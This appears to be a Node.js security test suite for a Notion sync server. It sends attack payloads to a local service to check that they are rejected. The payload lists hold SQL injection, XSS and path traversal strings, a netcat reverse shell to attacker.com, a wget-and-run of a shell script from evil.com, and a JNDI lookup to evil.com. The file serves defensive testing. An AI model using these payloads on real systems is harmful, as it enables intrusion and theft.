/**
 * Penetration Testing Framework for Notion Sync System
 * Security validation and vulnerability assessment
 */

import { test, describe, before, after } from 'node:test';
import assert from 'node:assert';
import { createServer } from 'http';
import { parse } from 'url';
import crypto from 'crypto';

// Security test configuration
const PENTEST_CONFIG = {
  target: {
    host: 'localhost',
    port: process.env.TEST_PORT || 3001,
    protocol: 'http'
  },
  timeout: 5000,
  maxPayloadSize: 10 * 1024 * 1024, // 10MB
  maxConcurrentRequests: 100
};

/**
 * HTTP Client for penetration testing
 */
class PenTestClient {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
  }

  async request(method, path, options = {}) {
    const { body, headers = {}, timeout = PENTEST_CONFIG.timeout } = options;

    return new Promise((resolve, reject) => {
      const url = new URL(path, this.baseUrl);
      const requestOptions = {
        method,
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        headers: {
          'Content-Type': 'application/json',
          ...headers
        },
        timeout
      };

      const req = (url.protocol === 'https:' ? require('https') : require('http')).request(requestOptions, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: data,
            responseTime: Date.now() - startTime
          });
        });
      });

      const startTime = Date.now();

      req.on('error', reject);
      req.on('timeout', () => reject(new Error('Request timeout')));

      if (body) {
        req.write(typeof body === 'string' ? body : JSON.stringify(body));
      }

      req.end();
    });
  }

  async get(path, options = {}) {
    return this.request('GET', path, options);
  }

  async post(path, body, options = {}) {
    return this.request('POST', path, { ...options, body });
  }

  async put(path, body, options = {}) {
    return this.request('PUT', path, { ...options, body });
  }

  async delete(path, options = {}) {
    return this.request('DELETE', path, options);
  }
}

/**
 * Payload generators for attack simulation
 */
const AttackPayloads = {
  // SQL Injection attempts
  sqlInjection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM information_schema.tables --",
    "admin'--",
    "admin'/*",
    "' OR 1=1#"
  ],

  // XSS attempts
  xss: [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
  ],

  // Command injection
  commandInjection: [
    "; cat /etc/passwd",
    "| ls -la",
    "; nc -e /bin/sh attacker.com 4444",
    "`id`",
    "$(whoami)",
    "; wget http://evil.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh"
  ],

  // Path traversal
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd"
  ],

  // NoSQL injection
  nosqlInjection: [
    { "$ne": null },
    { "$regex": ".*" },
    { "$where": "1==1" },
    { "$gt": "" },
    { "$exists": true }
  ],

  // Large payloads for DoS
  largePyloads: {
    generateLarge: (size) => 'A'.repeat(size),
    generateDeepNested: (depth) => {
      let obj = {};
      for (let i = 0; i < depth; i++) {
        obj = { nested: obj };
      }
      return obj;
    }
  }
};

describe('Penetration Tests - Input Validation', () => {

  let client;
  let testServer;

  before(async () => {
    // Start test server
    const { default: app } = await import('../index.js');

    client = new PenTestClient(`${PENTEST_CONFIG.target.protocol}://${PENTEST_CONFIG.target.host}:${PENTEST_CONFIG.target.port}`);
  });

  test('SQL Injection Protection', async () => {
    for (const payload of AttackPayloads.sqlInjection) {
      const maliciousFact = {
        factId: payload,
        factText: payload,
        factType: payload
      };

      const response = await client.post('/sync', [maliciousFact]);

      // Should not return 200 with malicious payload
      assert.ok(response.status !== 200 || response.body.includes('error'),
        `SQL injection payload should be rejected: ${payload}`);
    }
  });

  test('XSS Protection', async () => {
    for (const payload of AttackPayloads.xss) {
      const maliciousFact = {
        factId: `test-${Date.now()}`,
        factText: payload,
        factType: 'ACTION'
      };

      const response = await client.post('/sync', [maliciousFact]);

      // Response should not contain unescaped script tags
      assert.ok(!response.body.includes('<script>'),
        `XSS payload should be sanitized: ${payload}`);
    }
  });

  test('Command Injection Protection', async () => {
    for (const payload of AttackPayloads.commandInjection) {
      const maliciousFact = {
        factId: `test-${Date.now()}`,
        verificationMethod: payload,
        locationRef: payload
      };

      const response = await client.post('/sync', [maliciousFact]);

      // Should not execute commands or return system information
      assert.ok(!response.body.includes('uid=') && !response.body.includes('root:'),
        `Command injection should be prevented: ${payload}`);
    }
  });

  test('Path Traversal Protection', async () => {
    for (const payload of AttackPayloads.pathTraversal) {
      const response = await client.get(`/health?file=${encodeURIComponent(payload)}`);

      // Should not return file contents
      assert.ok(!response.body.includes('root:x:0:0') &&
                !response.body.includes('# Copyright (c) 1993-2009 Microsoft Corp'),
        `Path traversal should be prevented: ${payload}`);
    }
  });

  test('NoSQL Injection Protection', async () => {
    for (const payload of AttackPayloads.nosqlInjection) {
      const maliciousFact = {
        factId: payload,
        factText: 'test',
        factType: payload
      };

      const response = await client.post('/sync', [maliciousFact]);

      // Should handle NoSQL injection attempts gracefully
      assert.ok(response.status !== 200 || !response.body.includes('error'),
        `NoSQL injection should be handled: ${JSON.stringify(payload)}`);
    }
  });
});

describe('Penetration Tests - DoS Protection', () => {
  let client;

  before(() => {
    client = new PenTestClient(`${PENTEST_CONFIG.target.protocol}://${PENTEST_CONFIG.target.host}:${PENTEST_CONFIG.target.port}`);
  });

  test('Large Payload Protection', async () => {
    const largePayload = AttackPayloads.largePyloads.generateLarge(PENTEST_CONFIG.maxPayloadSize + 1000);

    const maliciousFact = {
      factId: 'test-large',
      factText: largePayload
    };

    const response = await client.post('/sync', [maliciousFact]);

    // Should reject oversized payloads
    assert.ok(response.status === 413 || response.status === 400,
      'Large payloads should be rejected');
  });

  test('Deep Nesting Protection', async () => {
    const deepNestedPayload = AttackPayloads.largePyloads.generateDeepNested(1000);

    const response = await client.post('/sync', deepNestedPayload);

    // Should handle deeply nested objects without crashing
    assert.ok(response.status !== 500, 'Deep nesting should not cause server crash');
  });

  test('Request Flooding Protection', async () => {
    const startTime = Date.now();
    const requests = [];

    // Generate many concurrent requests
    for (let i = 0; i < PENTEST_CONFIG.maxConcurrentRequests; i++) {
      requests.push(client.get('/health').catch(() => ({ status: 429 })));
    }

    const responses = await Promise.all(requests);
    const endTime = Date.now();

    // Check for rate limiting
    const rateLimitedCount = responses.filter(r => r.status === 429).length;

    assert.ok(rateLimitedCount > 0 || endTime - startTime > 1000,
      'Should implement rate limiting or graceful degradation');
  });

  test('Slowloris Attack Protection', async () => {
    // Simulate slow request attack
    const slowRequests = [];

    for (let i = 0; i < 10; i++) {
      const promise = new Promise((resolve) => {
        setTimeout(async () => {
          try {
            const response = await client.get('/health');
            resolve(response);
          } catch (error) {
            resolve({ status: 408, error: error.message });
          }
        }, 100 * i); // Staggered slow requests
      });

      slowRequests.push(promise);
    }

    const responses = await Promise.all(slowRequests);

    // Server should remain responsive
    const successfulResponses = responses.filter(r => r.status === 200).length;
    assert.ok(successfulResponses > 0, 'Server should remain responsive during slow attacks');
  });
});

describe('Penetration Tests - Authentication & Authorization', () => {
  let client;

  before(() => {
    client = new PenTestClient(`${PENTEST_CONFIG.target.protocol}://${PENTEST_CONFIG.target.host}:${PENTEST_CONFIG.target.port}`);
  });

  test('Missing Authentication Headers', async () => {
    const response = await client.post('/sync', [{ factId: 'test' }], {
      headers: {} // No auth headers
    });

    // Should handle missing auth gracefully (depending on your auth strategy)
    assert.ok(response.status === 401 || response.status === 200,
      'Missing auth should be handled appropriately');
  });

  test('Invalid JWT Token', async () => {
    const invalidToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature';

    const response = await client.post('/sync', [{ factId: 'test' }], {
      headers: {
        'Authorization': `Bearer ${invalidToken}`
      }
    });

    // Should reject invalid tokens
    assert.ok(response.status === 401 || response.status === 403,
      'Invalid tokens should be rejected');
  });

  test('Token Injection Attempts', async () => {
    const maliciousTokens = [
      'Bearer ../../../../etc/passwd',
      'Bearer <script>alert("xss")</script>',
      'Bearer \'; DROP TABLE users; --',
      'Bearer ${jndi:ldap://evil.com/exploit}'
    ];

    for (const token of maliciousTokens) {
      const response = await client.get('/health', {
        headers: { 'Authorization': token }
      });

      // Should not execute or leak information
      assert.ok(!response.body.includes('root:') &&
                !response.body.includes('<script>'),
        `Malicious token should be handled safely: ${token}`);
    }
  });

  test('Privilege Escalation Attempts', async () => {
    const escalationPayloads = [
      { role: 'admin' },
      { permissions: ['*'] },
      { isAdmin: true },
      { userId: '../../../admin' },
      { scope: 'global:admin' }
    ];

    for (const payload of escalationPayloads) {
      const response = await client.post('/sync', [payload]);

      // Should not grant elevated privileges
      assert.ok(response.status !== 200 || !response.body.includes('admin'),
        `Privilege escalation should be prevented: ${JSON.stringify(payload)}`);
    }
  });
});

describe('Penetration Tests - Data Protection', () => {
  let client;

  before(() => {
    client = new PenTestClient(`${PENTEST_CONFIG.target.protocol}://${PENTEST_CONFIG.target.host}:${PENTEST_CONFIG.target.port}`);
  });

  test('Sensitive Data Exposure', async () => {
    const response = await client.get('/metrics');

    // Should not expose sensitive information
    const sensitivePatterns = [
      /secret_[a-zA-Z0-9_]+/gi,
      /password\s*[:=]\s*[^\s]+/gi,
      /api[_-]?key\s*[:=]\s*[^\s]+/gi,
      /token\s*[:=]\s*[^\s]+/gi,
      /ntn_[a-zA-Z0-9]+/gi // Notion tokens
    ];

    for (const pattern of sensitivePatterns) {
      assert.ok(!pattern.test(response.body),
        `Should not expose sensitive data matching: ${pattern}`);
    }
  });

  test('Information Disclosure via Error Messages', async () => {
    // Try to trigger detailed error messages
    const malformedRequests = [
      () => client.post('/sync', 'invalid json'),
      () => client.post('/sync', { malformed: 'object without array' }),
      () => client.get('/nonexistent/endpoint'),
      () => client.post('/sync', null)
    ];

    for (const request of malformedRequests) {
      const response = await request();

      // Should not reveal internal paths, database info, or stack traces
      assert.ok(!response.body.includes('/Users/') &&
                !response.body.includes('C:\\') &&
                !response.body.includes('at Object.') &&
                !response.body.includes('node_modules'),
        'Error messages should not reveal internal information');
    }
  });

  test('Data Injection via Headers', async () => {
    const maliciousHeaders = {
      'X-Forwarded-For': '<script>alert("xss")</script>',
      'User-Agent': '; cat /etc/passwd',
      'Referer': 'javascript:alert("xss")',
      'X-Real-IP': '$(whoami)',
      'Content-Type': 'application/json; charset=utf-8\r\nX-Injected: malicious'
    };

    const response = await client.post('/sync', [{ factId: 'test' }], {
      headers: maliciousHeaders
    });

    // Response should not contain unescaped header values
    for (const [header, value] of Object.entries(maliciousHeaders)) {
      assert.ok(!response.body.includes(value),
        `Header injection should be prevented: ${header}`);
    }
  });
});

describe('Penetration Tests - System Security', () => {
  let client;

  before(() => {
    client = new PenTestClient(`${PENTEST_CONFIG.target.protocol}://${PENTEST_CONFIG.target.host}:${PENTEST_CONFIG.target.port}`);
  });

  test('HTTP Security Headers', async () => {
    const response = await client.get('/health');

    const securityHeaders = {
      'x-content-type-options': 'nosniff',
      'x-frame-options': /(deny|sameorigin)/i,
      'x-xss-protection': '1; mode=block',
      'strict-transport-security': /max-age=\d+/i
    };

    for (const [header, expected] of Object.entries(securityHeaders)) {
      const headerValue = response.headers[header.toLowerCase()];

      if (typeof expected === 'string') {
        assert.strictEqual(headerValue, expected,
          `Security header ${header} should be set correctly`);
      } else {
        assert.ok(expected.test(headerValue || ''),
          `Security header ${header} should match pattern: ${expected}`);
      }
    }
  });

  test('CORS Configuration', async () => {
    const response = await client.get('/health', {
      headers: {
        'Origin': 'https://evil.com',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type'
      }
    });

    const corsHeaders = response.headers;

    // Should not allow arbitrary origins
    assert.notStrictEqual(corsHeaders['access-control-allow-origin'], '*',
      'Should not allow all origins');

    assert.notStrictEqual(corsHeaders['access-control-allow-origin'], 'https://evil.com',
      'Should not allow malicious origins');
  });

  test('Method Override Protection', async () => {
    // Try to override HTTP methods
    const overrideAttempts = [
      { 'X-HTTP-Method-Override': 'DELETE' },
      { 'X-HTTP-Method': 'PUT' },
      { 'X-Method-Override': 'PATCH' },
      { '_method': 'DELETE' }
    ];

    for (const headers of overrideAttempts) {
      const response = await client.post('/sync', [{ factId: 'test' }], { headers });

      // Should not allow method override to dangerous methods
      assert.ok(response.status !== 200 || !response.body.includes('deleted'),
        `Method override should be restricted: ${JSON.stringify(headers)}`);
    }
  });
});

// Security test utilities
export const SecurityTestUtils = {
  generateMaliciousPayload: (type, size = 1000) => {
    switch (type) {
      case 'xss':
        return AttackPayloads.xss[Math.floor(Math.random() * AttackPayloads.xss.length)];
      case 'sql':
        return AttackPayloads.sqlInjection[Math.floor(Math.random() * AttackPayloads.sqlInjection.length)];
      case 'large':
        return AttackPayloads.largePyloads.generateLarge(size);
      default:
        return 'malicious-payload';
    }
  },

  validateSecurityHeaders: (headers) => {
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection'
    ];

    return requiredHeaders.every(header => headers[header]);
  },

  sanitizeOutput: (data) => {
    return JSON.stringify(data).replace(/[<>]/g, '');
  }
};